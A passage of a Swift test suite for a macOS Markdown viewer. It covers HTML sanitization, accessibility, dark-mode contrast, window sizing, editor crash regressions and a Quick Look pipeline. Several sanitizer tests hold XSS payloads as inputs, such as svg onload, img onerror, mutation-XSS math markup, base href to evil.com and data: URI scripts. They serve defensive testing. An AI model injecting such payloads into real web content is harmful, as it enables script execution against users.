    try expect(!clean.contains("\"data:"), "Should block data: URI in img")
    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
}

// --- Vector 8: Math tags ---

runner.test("sanitizer strips math tags") {
    let html = "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)></mglyph></mtext></math>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<math"), "Should strip math tags")
}

// --- Combined / edge cases ---

runner.test("sanitizer handles multiple vectors in one payload") {
    let html = "<svg onload=alert(1)></svg><style>@import url(evil)</style><base href=\"https://evil.com\"><form><input type=password></form><link rel=stylesheet href=evil.css>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<svg"), "Should strip svg")
    try expect(!clean.contains("<style"), "Should strip style")
    try expect(!clean.contains("<base"), "Should strip base")
    try expect(!clean.contains("<form"), "Should strip form")
    try expect(!clean.contains("<input"), "Should strip input")
    try expect(!clean.contains("<link"), "Should strip link")
}

runner.test("sanitizer preserves safe HTML after stripping dangerous content") {
    let html = "<h1>Title</h1><svg onload=alert(1)></svg><p>Paragraph with <strong>bold</strong> text.</p><style>body{display:none}</style><ul><li>Item</li></ul>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<svg"), "Should strip svg")
    try expect(!clean.contains("<style"), "Should strip style")
    try expect(clean.contains("<h1>Title</h1>"), "Should preserve h1")
    try expect(clean.contains("<strong>bold</strong>"), "Should preserve strong")
    try expect(clean.contains("<li>Item</li>"), "Should preserve list items")
}

runner.test("sanitizer strips dangerous tags case-insensitively") {
    let cases: [(String, String)] = [
        ("<SVG onload='x'>evil</SVG>", "SVG uppercase"),
        ("<Style>body{color:red}</Style>", "STYLE uppercase"),
        ("<Base href='http://evil.com'>", "BASE uppercase"),
        ("<Link rel='stylesheet' href='http://evil.com'>", "LINK uppercase"),
        ("<Math><annotation-xml encoding='text/html'><script>evil</script></annotation-xml></Math>", "MATH uppercase"),
        ("<IMG src='DATA:text/html,<script>evil</script>'>", "DATA URI case-insensitive"),
    ]
    let sanitizer = HTMLSanitizer()
    for (input, label) in cases {
        let result = sanitizer.sanitize(input)
        let isStripped = !result.lowercased().contains("<svg") &&
                         !result.lowercased().contains("<style") &&
                         !result.lowercased().contains("<base") &&
                         !result.lowercased().contains("<link") &&
                         !result.lowercased().contains("<math") &&
                         !result.contains("DATA:")
        // At minimum the dangerous pattern should be absent or defanged
        try expect(result.count < input.count || !result.contains("evil") || isStripped,
            "Case-insensitive sanitization failed for: \(label)")
    }
}

// HTML plugin integration

runner.test("HTML plugin sanitizes by default") {
    let plugin = HTMLPlugin()
    let html = "<p>Hello</p><script>alert('xss')</script>"
    let result = plugin.render(source: html)
    try expect(!result.contains("<script"), "HTML plugin should sanitize")
    try expect(result.contains("<p>Hello</p>"), "Should preserve safe content")
    try expect(!plugin.requiresJSExecution, "HTML plugin should not require JS (sanitized)")
}


// =============================================================================
// MARK: - Accessibility (A11Y) Tests
// =============================================================================

print("\n=== Accessibility Tests ===")

runner.test("inline template has article with role=document") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    try expect(full.contains("role=\"document\""), "Missing role=document on article")
    try expect(full.contains("aria-label=\"Rendered markdown content\""), "Missing aria-label on article")
}

runner.test("postProcessForAccessibility adds table role") {
    let html = "<table><tr><th>Name</th></tr><tr><td>Alice</td></tr></table>"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("<table role=\"table\">"), "Missing role=table")
}

runner.test("postProcessForAccessibility adds scope=col to th") {
    let html = "<table><tr><th>Name</th><th align=\"center\">Age</th></tr></table>"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("scope=\"col\"") && processed.contains("<th"), "Missing scope=col on th")
    try expect(processed.contains("align=\"center\""), "Missing alignment on aligned th")
}

runner.test("postProcessForAccessibility adds aria-label to code blocks") {
    let html = "<pre><code class=\"language-swift\">let x = 1</code></pre>"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("<pre aria-label=\"Code block\">"), "Missing aria-label on pre")
}

runner.test("postProcessForAccessibility adds aria-label to task checkboxes") {
    let html = "<input type=\"checkbox\" checked=\"\" disabled=\"\"> Done"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("aria-label=\"Task item\""), "Missing aria-label on checkbox")
}

runner.test("postProcessForAccessibility on GFM table fixture") {
    let md = "| Name | Age |\n|------|-----|\n| Alice | 30 |"
    let html = MarkdownRenderer.renderHTML(from: md)
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("role=\"table\""), "Fixture table missing role")
    try expect(processed.contains("scope=\"col\""), "Fixture th missing scope")
}

runner.test("postProcessForAccessibility on task list fixture") {
    let md = "- [x] Done\n- [ ] Not done"
    let html = MarkdownRenderer.renderHTML(from: md)
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("aria-label=\"Task item\""), "Task checkboxes missing aria-label")
}


// MARK: - Internationalization (I18N) Tests

print("\n=== Internationalization Tests ===")

runner.test("inline template has lang attribute") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    try expect(full.contains("<html lang=\"en\">"), "Inline template missing lang=en attribute")
}


// =============================================================================
// MARK: - Dark Mode Explicit Color Regression Tests
// =============================================================================
// These tests prevent the bug where dark mode elements relied on CSS color
// inheritance from body, which fails in WKWebView. Every visible element
// MUST have an explicit color property in dark mode CSS.

print("\n=== Dark Mode Explicit Color Regression ===")

/// Parse dark mode CSS from a full HTML document and return selector → properties map.
func extractDarkModeRules(from html: String) -> [String: [String: String]] {
    let css = extractCSS(from: html)
    let (_, darkCSS) = splitLightDarkCSS(css)
    let rules = parseCSSRules(darkCSS)
    var result: [String: [String: String]] = [:]
    for rule in rules {
        result[rule.selector] = rule.properties
    }
    return result
}

/// Elements that display text and MUST have explicit color in dark mode.
/// Relying on body color inheritance is fragile in WKWebView.
let requiredExplicitColorSelectors = [
    ("body", "body text"),
    ("code:not([class*=\"language-\"])", "inline code"),
    ("th, td", "table cells"),
    ("pre", "code blocks"),
    ("h1, h2, h3, h4, h5", "headings"),
]

runner.test("inline template: all text elements have explicit dark color") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let darkRules = extractDarkModeRules(from: full)

    var missing: [String] = []
    for (selector, description) in requiredExplicitColorSelectors {
        let props = darkRules[selector] ?? [:]
        if props["color"] == nil {
            missing.append("\(selector) (\(description))")
        }
    }

    if !missing.isEmpty {
        throw TestError.assertionFailed(
            "Dark mode missing explicit color on \(missing.count) text elements " +
            "(DO NOT rely on inheritance from body):\n  " +
            missing.joined(separator: "\n  ")
        )
    }
}


runner.test("WebPreviewView darkModeCSS: all text elements have explicit color") {
    // Read WebPreviewView.swift and extract the darkModeCSS constant
    let cwd = FileManager.default.currentDirectoryPath
    let wpvPath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/WebPreviewView.swift")
    let source = try String(contentsOf: wpvPath, encoding: .utf8)

    // Extract the darkModeCSS array content from source
    guard let darkStart = source.range(of: "private static let darkModeCSS = ["),
          let darkEnd = source.range(of: "].joined(separator:", range: darkStart.upperBound..<source.endIndex) else {
        throw TestError.assertionFailed("Could not find darkModeCSS constant in WebPreviewView.swift")
    }
    let darkCSSSource = String(source[darkStart.upperBound..<darkEnd.lowerBound])
    // Unescape Swift string escapes to get the actual CSS
    let darkCSS = darkCSSSource
        .replacingOccurrences(of: "\\\"", with: "\"")
        .replacingOccurrences(of: "\\n", with: "\n")

    for (selector, description) in requiredExplicitColorSelectors {
        // Find the CSS rule string for this selector
        guard let ruleStart = darkCSS.range(of: "\(selector) {") else {
            throw TestError.assertionFailed("darkModeCSS missing selector: \(selector) (\(description))")
        }
        let afterSelector = String(darkCSS[ruleStart.upperBound...])
        guard let ruleEndIdx = afterSelector.firstIndex(of: "}") else { continue }
        let ruleBody = String(afterSelector[afterSelector.startIndex..<ruleEndIdx])
        try expect(ruleBody.contains("color:"),
            "darkModeCSS: \(selector) (\(description)) missing explicit color property — " +
            "DO NOT rely on inheritance from body")
    }
}

runner.test("dark mode CSS is consistent across all 3 locations") {
    // Verify that the key dark mode colors match across template.html,
    // inline template, and WebPreviewView.swift darkModeCSS
    let cwd = FileManager.default.currentDirectoryPath

    // 1. Inline template
    let inlineHTML = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let inlineDark = extractDarkModeRules(from: inlineHTML)

    // 2. template.html
    let templatePath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkViewCore/Resources/template.html")
    let templateHTML = try String(contentsOf: templatePath, encoding: .utf8)
    let templateDark = extractDarkModeRules(from: templateHTML)

    // Check key selectors match between inline and template
    let criticalSelectors = ["body", "code:not([class*=\"language-\"])", "th, td", "pre"]
    var mismatches: [String] = []

    for sel in criticalSelectors {
        let inlineColor = inlineDark[sel]?["color"]
        let templateColor = templateDark[sel]?["color"]

        if inlineColor != templateColor {
            mismatches.append("\(sel): inline=\(inlineColor ?? "nil") vs template=\(templateColor ?? "nil")")
        }

        let inlineBg = inlineDark[sel]?["background"] ?? inlineDark[sel]?["background-color"]
        let templateBg = templateDark[sel]?["background"] ?? templateDark[sel]?["background-color"]

        if inlineBg != templateBg {
            mismatches.append("\(sel) bg: inline=\(inlineBg ?? "nil") vs template=\(templateBg ?? "nil")")
        }
    }

    if !mismatches.isEmpty {
        throw TestError.assertionFailed(
            "Dark mode CSS inconsistency between inline template and template.html:\n  " +
            mismatches.joined(separator: "\n  ")
        )
    }
}

runner.test("dark mode text contrast >= 4.5:1 for all explicit colors") {
    // WCAG AA requires >= 4.5:1 for normal text
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let darkRules = extractDarkModeRules(from: full)

    // Parse hex color to relative luminance
    func luminance(_ hex: String) -> Double? {
        let h = hex.trimmingCharacters(in: CharacterSet(charactersIn: "#"))
        guard h.count == 6 else { return nil }
        let scanner = Scanner(string: h)
        var rgb: UInt64 = 0
        scanner.scanHexInt64(&rgb)
        let r = Double((rgb >> 16) & 0xFF) / 255.0
        let g = Double((rgb >> 8) & 0xFF) / 255.0
        let b = Double(rgb & 0xFF) / 255.0
        func linearize(_ c: Double) -> Double { c <= 0.03928 ? c / 12.92 : pow((c + 0.055) / 1.055, 2.4) }
        return 0.2126 * linearize(r) + 0.7152 * linearize(g) + 0.0722 * linearize(b)
    }

    func contrastRatio(_ l1: Double, _ l2: Double) -> Double {
        let lighter = max(l1, l2)
        let darker = min(l1, l2)
        return (lighter + 0.05) / (darker + 0.05)
    }

    // Dark background
    let bgHex = "#0d1117"
    guard let bgLum = luminance(bgHex) else {
        throw TestError.assertionFailed("Could not parse background color")
    }

    // Check all elements with explicit color
    var failures: [String] = []
    for (selector, description) in requiredExplicitColorSelectors {
        guard let colorValue = darkRules[selector]?["color"] else { continue }
        // Extract hex color from value (might be "#e6edf3" or "#8b949e" etc)
        let hexPattern = "#[0-9a-fA-F]{6}"
        guard let hexRange = colorValue.range(of: hexPattern, options: .regularExpression),
              let fgLum = luminance(String(colorValue[hexRange])) else { continue }

        let ratio = contrastRatio(fgLum, bgLum)
        if ratio < 4.5 {
            failures.append("\(selector) (\(description)): \(colorValue) on \(bgHex) = \(String(format: "%.1f", ratio)):1 (need >= 4.5:1)")
        }
    }

    if !failures.isEmpty {
        throw TestError.assertionFailed(
            "WCAG AA contrast failures in dark mode:\n  " +
            failures.joined(separator: "\n  ")
        )
    }
}

runner.test("WebPreviewView .system theme injects dark CSS (not just media query)") {
    // Verify that WebPreviewView.swift handles .system theme by detecting
    // the system appearance and injecting darkModeCSS, NOT just relying on
    // @media (prefers-color-scheme: dark) which is unreliable in WKWebView
    let cwd = FileManager.default.currentDirectoryPath
    let wpvPath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/WebPreviewView.swift")
    let source = try String(contentsOf: wpvPath, encoding: .utf8)

    // Find the .system case in injectSettingsCSS
    guard source.contains("case .system:") else {
        throw TestError.assertionFailed("WebPreviewView missing .system case")
    }

    // Verify it does NOT just break/return — it must inject dark CSS conditionally
    // Look for the pattern: case .system followed by dark mode detection
    try expect(
        source.contains("systemIsDarkMode") || source.contains("effectiveAppearance"),
        "WebPreviewView .system theme must detect dark mode and inject CSS explicitly " +
        "(WKWebView @media prefers-color-scheme is unreliable)"
    )

    // Verify webView.appearance is set (so media query works as backup)
    try expect(
        source.contains("webView.appearance"),
        "WebPreviewView must set webView.appearance to sync with system theme"
    )
}

// =============================================================================
// MARK: - Window Sizing Tests
// =============================================================================
// Validates the window sizing logic used by MarkViewApp and ContentView.
// Tests the computation (screen percentages, minimums, centering) without requiring
// a running window — ensures sizing regressions are caught automatically.

print("\n=== Window Sizing Tests ===")

// Simulate the sizing functions extracted from MarkViewApp/ContentView
struct WindowSizingSpec {
    /// Preview-only mode: 55% width, 85% height
    static func previewOnlySize(screenWidth: CGFloat, screenHeight: CGFloat) -> (width: CGFloat, height: CGFloat) {
        let w = max(screenWidth * 0.55, 800)
        let h = max(screenHeight * 0.85, 600)
        return (w, h)
    }

    /// Editor+preview mode: 80% width
    static func editorPreviewWidth(screenWidth: CGFloat) -> CGFloat {
        max(screenWidth * 0.80, 900)
    }

    /// Toggle sizing: returns target width for mode
    static func toggleTargetWidth(screenWidth: CGFloat, showEditor: Bool) -> CGFloat {
        if showEditor {
            return max(screenWidth * 0.80, 900)
        } else {
            return max(screenWidth * 0.55, 800)
        }
    }

    /// Center a window of given width on screen
    static func centeredX(screenOriginX: CGFloat, screenWidth: CGFloat, windowWidth: CGFloat) -> CGFloat {
        screenOriginX + (screenWidth - windowWidth) / 2
    }
}

runner.test("preview-only default: 55% screen width on standard display") {
    let (w, h) = WindowSizingSpec.previewOnlySize(screenWidth: 1920, screenHeight: 1080)
    try expect(w == 1056, "expected 1056, got \(w)")
    try expect(h == 918, "expected 918, got \(h)")
}

runner.test("preview-only default: min 800 kicks in on laptop display") {
    let (w, _) = WindowSizingSpec.previewOnlySize(screenWidth: 1440, screenHeight: 900)
    // 1440*0.55=792 < 800, so min kicks in
    try expect(w == 800, "expected 800 (min), got \(w)")
}

runner.test("preview-only minimum width: 800px on small screens") {
    let (w, _) = WindowSizingSpec.previewOnlySize(screenWidth: 1200, screenHeight: 800)
    // 1200 * 0.55 = 660, min 800 kicks in
    try expect(w == 800, "expected 800 minimum, got \(w)")
}

runner.test("preview-only minimum height: 600px on small screens") {
    let (_, h) = WindowSizingSpec.previewOnlySize(screenWidth: 1200, screenHeight: 600)
    // 600 * 0.85 = 510, min 600 kicks in
    try expect(h == 600, "expected 600 minimum, got \(h)")
}

runner.test("editor+preview: 80% screen width on standard display") {
    let w = WindowSizingSpec.editorPreviewWidth(screenWidth: 1920)
    try expect(w == 1536, "expected 1536, got \(w)")
}

runner.test("editor+preview minimum width: 900px on small screens") {
    let w = WindowSizingSpec.editorPreviewWidth(screenWidth: 1000)
    // 1000 * 0.80 = 800, min 900 kicks in
    try expect(w == 900, "expected 900 minimum, got \(w)")
}

runner.test("editor+preview is always wider than preview-only") {
    for screenWidth: CGFloat in [1000, 1200, 1440, 1920, 2560, 3840] {
        let previewWidth = WindowSizingSpec.toggleTargetWidth(screenWidth: screenWidth, showEditor: false)
        let editorWidth = WindowSizingSpec.toggleTargetWidth(screenWidth: screenWidth, showEditor: true)
        try expect(editorWidth > previewWidth,
            "editor (\(editorWidth)) must be wider than preview (\(previewWidth)) at screen \(screenWidth)")
    }
}

runner.test("toggle to editor widens, toggle back narrows") {
    let screen: CGFloat = 1920
    let previewW = WindowSizingSpec.toggleTargetWidth(screenWidth: screen, showEditor: false)
    let editorW = WindowSizingSpec.toggleTargetWidth(screenWidth: screen, showEditor: true)
    try expect(editorW > previewW, "editor should be wider")
    try expect(editorW / previewW > 1.3, "editor should be at least 30% wider than preview-only")
}

runner.test("window centering calculation") {
    let x = WindowSizingSpec.centeredX(screenOriginX: 0, screenWidth: 1920, windowWidth: 1056)
    try expect(x == 432, "expected centered at 432, got \(x)")
}

runner.test("window centering with screen offset (multi-monitor)") {
    let x = WindowSizingSpec.centeredX(screenOriginX: -1920, screenWidth: 1920, windowWidth: 1056)
    try expect(x == -1488, "expected centered at -1488 on secondary monitor, got \(x)")
}

runner.test("ultra-wide screen: preview-only doesn't stretch too wide") {
    let (w, _) = WindowSizingSpec.previewOnlySize(screenWidth: 3440, screenHeight: 1440)
    // 3440 * 0.55 = 1892 — wide but reasonable (use tolerance for floating point)
    try expect(abs(w - 1892) < 1, "expected ~1892, got \(w)")
    try expect(w < 2000, "preview-only should stay under 2000px even on ultra-wide")
}

runner.test("ultra-wide screen: editor+preview uses 80%") {
    let w = WindowSizingSpec.editorPreviewWidth(screenWidth: 3440)
    try expect(w == 2752, "expected 2752, got \(w)")
}

// =============================================================================
// MARK: - Window Title Tests
// =============================================================================
// Validates that window title stays in sync with the loaded file.
// Bug: when opening a subsequent file, the title bar kept the old filename
// because the imperative NSApplication.shared.mainWindow?.title could fail
// silently when mainWindow was nil. Fix: use reactive .navigationTitle().

print("\n=== Window Title Tests ===")

runner.test("fileName updates correctly for various file paths") {
    // Simulate the URL(fileURLWithPath:).lastPathComponent extraction
    let testCases: [(path: String, expected: String)] = [
        ("/Users/test/docs/README.md", "README.md"),
        ("/Users/test/flow-business-plan.md", "flow-business-plan.md"),
        ("/Users/test/docs/personal/prioritized-action-items.md", "prioritized-action-items.md"),
        ("/tmp/test.md", "test.md"),
        ("/Users/test/My Documents/notes.md", "notes.md"),
    ]
    for (path, expected) in testCases {
        let result = URL(fileURLWithPath: path).lastPathComponent
        try expect(result == expected,
            "fileName for '\(path)' should be '\(expected)', got '\(result)'")
    }
}

runner.test("sequential file loads produce different fileNames") {
    // Simulate the exact scenario from the bug: open file A, then open file B
    // The fileName property must change each time
    let fileA = "/Users/test/flow-business-plan.md"
    let fileB = "/Users/test/docs/personal/prioritized-action-items.md"

    let nameA = URL(fileURLWithPath: fileA).lastPathComponent
    let nameB = URL(fileURLWithPath: fileB).lastPathComponent

    try expect(nameA == "flow-business-plan.md", "first file name wrong: \(nameA)")
    try expect(nameB == "prioritized-action-items.md", "second file name wrong: \(nameB)")
    try expect(nameA != nameB, "sequential file loads must produce different fileNames")
}


// =============================================================================
// MARK: — Editor (NSTextView) Tests
// =============================================================================
// Validates that EditorView uses NSTextView with find/replace support.

let editorSource = try! String(contentsOfFile: "Sources/MarkView/EditorView.swift", encoding: .utf8)

// =============================================================================
// MARK: - EditorView clampedRanges clamping logic — behavioral regression tests
//
// These tests directly exercise the NSRange clamping logic in updateNSView.
// Prior bugs:
//   #20 — guard used `<=` instead of `<`; loc == textLength passed through,
//         causing characterAtIndex: OOB when AppKit positioned the cursor.
//   #21 — negative NSRange.length (e.g. -3 stored as UInt64.max-2) passed
//         through guard; min(-3, remaining) = -3; NSRange(length:-3) caused
//         substringWithRange: OOB.
//
// All tests use pure Swift logic mirroring the compactMap in updateNSView
// so they run without a live NSTextView (no UI context required).
// =============================================================================

print("\n--- EditorView clampedRanges regression tests ---")

/// Mirrors the compactMap in updateNSView. Returns clamped ranges or nil (filtered) for each input.
func clampRanges(_ ranges: [NSRange], textLength: Int) -> [NSRange] {
    ranges.compactMap { range in
        guard range.location < textLength else { return nil }
        guard range.length >= 0 else { return nil }
        let loc = range.location
        let len = min(range.length, textLength - loc)
        return NSRange(location: loc, length: len)
    }
}

runner.test("clampedRanges: loc == textLength is dropped (Bug #20 regression)") {
    // Cursor at exact EOF: location = textLength. characterAtIndex: textLength is OOB
    // (0-indexed string, valid range 0..<textLength). Must be filtered out.
    let textLength = 5
    let result = clampRanges([NSRange(location: 5, length: 0)], textLength: textLength)
    try expect(result.isEmpty, "loc == textLength must be dropped; got \(result)")
}

runner.test("clampedRanges: loc > textLength is dropped") {
    let result = clampRanges([NSRange(location: 10, length: 0)], textLength: 5)
    try expect(result.isEmpty, "loc > textLength must be dropped; got \(result)")
}

runner.test("clampedRanges: negative length is dropped (Bug #21 regression)") {
    // NSRange.length is Int in Swift. A corrupted range can carry Int(-3)
    // (stored as 18446744073709551613 in the UInt wire format from AppKit).
    // min(-3, remaining) = -3; NSRange(length: -3) → substringWithRange OOB.
    let corruptedLength = -3
    let result = clampRanges([NSRange(location: 2, length: corruptedLength)], textLength: 10)
    try expect(result.isEmpty, "Negative length must be dropped; got \(result)")
}

runner.test("clampedRanges: valid insertion point (loc < textLength, length == 0) passes through") {
    let result = clampRanges([NSRange(location: 3, length: 0)], textLength: 5)
    try expect(result.count == 1, "Valid insertion point must pass through; got \(result)")
    try expect(result[0].location == 3 && result[0].length == 0,
        "Range must be unchanged; got \(result[0])")
}

runner.test("clampedRanges: length clamped when it would exceed textLength") {
    // Range {2, 10} in a 5-char string: remaining = 5 - 2 = 3, length clamped to 3.
    let result = clampRanges([NSRange(location: 2, length: 10)], textLength: 5)
    try expect(result.count == 1, "Oversized range must be clamped, not dropped; got \(result)")
    try expect(result[0].location == 2 && result[0].length == 3,
        "Length must be clamped to textLength - loc = 3; got \(result[0])")
}

runner.test("clampedRanges: exact-fit range passes unchanged") {
    // Range {0, 5} in a 5-char string: exactly fills the string, no clamping needed.
    let result = clampRanges([NSRange(location: 0, length: 5)], textLength: 5)
    try expect(result.count == 1, "Exact-fit range must pass through; got \(result)")
    try expect(result[0].location == 0 && result[0].length == 5,
        "Range must be unchanged; got \(result[0])")
}

runner.test("clampedRanges: empty input returns empty output") {
    let result = clampRanges([], textLength: 5)
    try expect(result.isEmpty, "Empty input must yield empty output; got \(result)")
}

runner.test("clampedRanges: multiple ranges — invalid entries dropped, valid clamped") {
    let input = [
        NSRange(location: 0, length: 2),   // valid
        NSRange(location: 5, length: 0),   // Bug #20: loc == textLength, must drop
        NSRange(location: 3, length: -1),  // Bug #21: negative length, must drop
        NSRange(location: 4, length: 8),   // oversized, clamp to 1
    ]
    let result = clampRanges(input, textLength: 5)
    try expect(result.count == 2, "2 valid ranges should survive; got \(result.count): \(result)")
    try expect(result[0].location == 0 && result[0].length == 2, "First range unchanged; got \(result[0])")
    try expect(result[1].location == 4 && result[1].length == 1, "Fourth range clamped; got \(result[1])")
}

// =============================================================================
// MARK: - EditorView hang/crash mechanism source checks
//
// These source-inspection tests are regression guards for three NSTextView crash/hang
// mechanisms that require specific API calls whose absence cannot be caught by unit tests
// alone (they only manifest in the live AppKit layer):
//
//   Hang #7/#11/#22/#23/#24 — NSLayoutManager glyph-fill hang:
//     setSelectedRanges with a non-zero position synchronously inside updateNSView forces
//     NSLayoutManager to generate ALL glyphs up to the cursor → blocks main thread 2000ms+.
//     Fix: defer cursor restoration via DispatchQueue.main.async.
//
//   EXC_BREAKPOINT (inline prediction) — _NSClearMarkedRange OOB:
//     If marked text (inline prediction/autocorrect) is held when setSelectedRanges fires,
//     AppKit flushes the suggestion against the already-replaced string → substringFromIndex OOB.
//     Fix: (1) disable inline prediction/autocorrect in makeNSView, (2) call unmarkText()
//     before any string or selectedRanges mutation in updateNSView.
// =============================================================================

print("\n--- EditorView hang/crash mechanism source checks ---")

runner.test("EditorView disables inline prediction in makeNSView (EXC_BREAKPOINT regression guard)") {
    // isAutomaticTextCompletionEnabled = false prevents macOS from holding "marked text"
    // (a pending inline suggestion) inside the NSTextView input context. If marked text
    // is present when updateNSView calls setSelectedRanges, _NSClearMarkedRange fires and
    // flushes the suggestion against the already-replaced string → substringFromIndex: OOB.
    try expect(editorSource.contains("isAutomaticTextCompletionEnabled = false"),
        "makeNSView must disable inline prediction to prevent _NSClearMarkedRange OOB crash")
}

runner.test("EditorView disables autocorrect in makeNSView (EXC_BREAKPOINT regression guard)") {
    // Autocorrect also accumulates marked text. Both completions and corrections must be
    // disabled to fully prevent the _NSClearMarkedRange / substringFromIndex: OOB path.
    try expect(editorSource.contains("isAutomaticSpellingCorrectionEnabled = false"),
        "makeNSView must disable autocorrect to prevent marked-text OOB crash")
}

runner.test("EditorView calls unmarkText before string mutation in updateNSView (EXC_BREAKPOINT regression guard)") {
    // Even with completions/corrections disabled, unmarkText() is a belt-and-suspenders
    // guard: it synchronously clears the input context's marked range with no undo side-effects,
    // ensuring no stale suggestion can fire during the subsequent string replacement.
    // Must appear before `textView.string = text` or `selectedRanges =` assignment.
    try expect(editorSource.contains("textView.unmarkText()"),
        "updateNSView must call textView.unmarkText() before replacing string or setting selectedRanges")
}

runner.test("EditorView defers cursor restoration via DispatchQueue.main.async (hang regression guard)") {
    // Synchronous setSelectedRanges with a non-zero position after textView.string = text
    // triggers _invalidateDisplayForChangeOfSelection → NSLayoutManager generates ALL glyphs
    // up to the cursor position synchronously → main thread hang 2000ms+ on large files.
    // The fix defers the non-zero restoration one runloop cycle so glyph fill is non-blocking.
    try expect(editorSource.contains("DispatchQueue.main.async"),
        "updateNSView must defer cursor restoration via DispatchQueue.main.async to avoid NSLayoutManager glyph-fill hang")
}

runner.test("EditorView resets selectedRanges to {0,0} synchronously before string replacement (OOB regression guard)") {
    // The synchronous reset MUST stay synchronous. During textView.string = text, AppKit
    // internally calls setSelectedRanges with the old (pre-replacement) cursor position.
    // If that position points past the end of the new (shorter) string, NSLayoutManager
    // computes an OOB blink rect → EXC_BREAKPOINT. The {0,0} reset neutralises this.
    try expect(editorSource.contains("NSValue(range: NSRange(location: 0, length: 0))"),
        "updateNSView must synchronously reset selectedRanges to {0,0} before textView.string assignment")
}

// =============================================================================
// MARK: - Quick Look Extension Tests
// =============================================================================

print("\n--- Quick Look Extension Tests ---")

let qlSourcePath = "Sources/MarkViewQuickLook/PreviewProvider.swift"
let qlPlistPath = "Sources/MarkViewQuickLook/Info.plist"
let qlSourceExists = FileManager.default.fileExists(atPath: qlSourcePath)
let qlPlistExists = FileManager.default.fileExists(atPath: qlPlistPath)
let qlSource = qlSourceExists ? (try? String(contentsOfFile: qlSourcePath, encoding: .utf8)) ?? "" : ""
let qlPlist = qlPlistExists ? (try? String(contentsOfFile: qlPlistPath, encoding: .utf8)) ?? "" : ""

runner.test("Quick Look extension source exists") {
    try expect(qlSourceExists, "PreviewProvider.swift must exist in Sources/MarkViewQuickLook/")
}

runner.test("Quick Look extension Info.plist exists") {
    try expect(qlPlistExists, "Info.plist must exist in Sources/MarkViewQuickLook/")
}

// =============================================================================
// MARK: - Quick Look Pipeline E2E Tests
// =============================================================================

print("\n--- Quick Look Pipeline E2E Tests ---")

/// Replicate the exact Quick Look extension rendering pipeline.
/// This is the same sequence PreviewProvider.providePreview() executes.
func quickLookPipeline(_ markdown: String) -> String {
    let html = MarkdownRenderer.renderHTML(from: markdown)
    let accessible = MarkdownRenderer.postProcessForAccessibility(html)
    return MarkdownRenderer.wrapInTemplate(accessible)
}

func qlGoldenFilePath(for fixtureName: String) -> URL? {
    Bundle.module.url(forResource: fixtureName, withExtension: "html", subdirectory: "Fixtures/expected/quick-look")
}

// E2E: Run every fixture through the full Quick Look pipeline and validate output
for name in fixtureNames {
    runner.test("QL pipeline renders \(name).md as valid HTML document") {
        let md = try loadFixture("\(name).md")
        let document = quickLookPipeline(md)

        // Must produce a well-formed HTML document
        try expect(document.contains("<!DOCTYPE html>"), "Missing DOCTYPE")
        try expect(document.contains("<html"), "Missing <html>")
        try expect(document.contains("</html>"), "Missing </html>")
        try expect(document.contains("<meta charset=\"utf-8\">"), "Missing charset")
        try expect(document.contains("<style>"), "Missing CSS styles")
        try expect(document.contains("</body>"), "Missing </body>")
    }
}

// E2E: Verify accessibility post-processing is applied (not just wrapInTemplate)
runner.test("QL pipeline includes ARIA attributes (not just raw template)") {
    let md = try loadFixture("gfm-tables.md")
    let document = quickLookPipeline(md)

    // These ARIA attributes come from postProcessForAccessibility — proves
    // the pipeline includes the accessibility pass, not just renderHTML+wrapInTemplate
    try expect(document.contains("role=\"table\""), "Tables must have role=table from accessibility post-processing")
    try expect(document.contains("scope=\"col\""), "Table headers must have scope=col")
}

runner.test("QL pipeline includes ARIA on code blocks") {
    let md = try loadFixture("code-blocks.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("aria-label=\"Code block\""), "Code blocks must have aria-label from accessibility post-processing")
}

runner.test("QL pipeline includes ARIA on task list checkboxes") {
    let md = try loadFixture("gfm-tasklists.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("aria-label=\"Task item\""), "Task checkboxes must have aria-label from accessibility post-processing")
}

runner.test("QL pipeline includes document landmark") {
    let md = try loadFixture("basic.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("role=\"document\""), "Body must include article with role=document")
    try expect(document.contains("aria-label=\"Rendered markdown content\""), "Article must have descriptive aria-label")
}

// E2E: Verify dark mode CSS is present (works via @media query in Quick Look)
runner.test("QL pipeline output includes dark mode CSS") {
    let md = try loadFixture("basic.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("prefers-color-scheme: dark"), "Inline template must include dark mode media query")
    try expect(document.contains("color: #e6edf3"), "Dark mode must set explicit text color")
    try expect(document.contains("background: #0d1117"), "Dark mode must set dark background")
}

// E2E: Edge cases the extension must handle gracefully
runner.test("QL pipeline handles empty input") {
    let document = quickLookPipeline("")
    try expect(document.contains("<!DOCTYPE html>"), "Empty input must still produce valid HTML")
    try expect(document.contains("<article"), "Empty input must still include article wrapper")
}

runner.test("QL pipeline handles large input without crash") {
    let largeMD = String(repeating: "# Heading\n\nParagraph with **bold** and *italic*.\n\n- Item 1\n- Item 2\n\n", count: 500)
    let document = quickLookPipeline(largeMD)
    try expect(document.contains("<!DOCTYPE html>"), "Large input must produce valid HTML")
    try expect(document.contains("<strong>bold</strong>"), "Large input must render inline markdown")
}

runner.test("QL pipeline handles unicode content") {
    let unicodeMD = "# 日本語テスト\n\nÉmojis: 🎉🚀 — Ñoño — Ü"
